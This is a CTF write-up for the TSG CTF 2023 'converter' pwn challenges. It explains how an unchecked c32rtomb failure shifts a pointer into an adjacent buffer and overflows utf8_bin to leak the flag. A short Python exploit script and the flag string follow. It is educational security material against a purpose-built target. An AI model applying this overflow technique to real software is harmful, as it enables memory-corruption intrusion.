# TSG CTF 2023 - pwn/converter

This solution is for both "converter" and "converter2".

## Solution

The bug is lack of return value checking in the code that converts a UTF-32 character to UTF-8:

```main.c:58
               utf8_ptr += c32rtomb(utf8_ptr, wc, &ps);
```

`c32rtomb` fails if an illegal UTF-32 character is given.
On failure, -1 is returned and added to `utf8_ptr`. This bug can be exploited to make `utf8_ptr` point into `utf32_hexstr[2]` and make `utf32_hexstr[2]` a longer string than expected. If you write a hex string that represents a valid UTF-32 character in this way, the conversion result will overflow `utf8_bin`.

```main.c:8
char utf32_hexstr[3][MAX_FLAG_CHARS * 8 + 1];
char utf8_bin[MAX_FLAG_CHARS * 4 + 1];
```

If the null terminator at the end of `utf8_bin` is overwritten, the following code will show the trailing bytes that includes the flag.

```main.c:71
        printf("Your input: %s\n", utf8_bin);
```

## Exploit

```python
m = [f"{ord(c):0>8x}" for c in "🚀".encode("utf-32be").hex()]
sc.after("Q1").send("ffffffff" * 22 + "".join(m) + "\n")
sc.after("Q2").send("\n")
sc.after("Q3").send("0001f680" * 31)
```



## Flag

```
TSGCTF{NoEmojiHereThough:cry:}
```

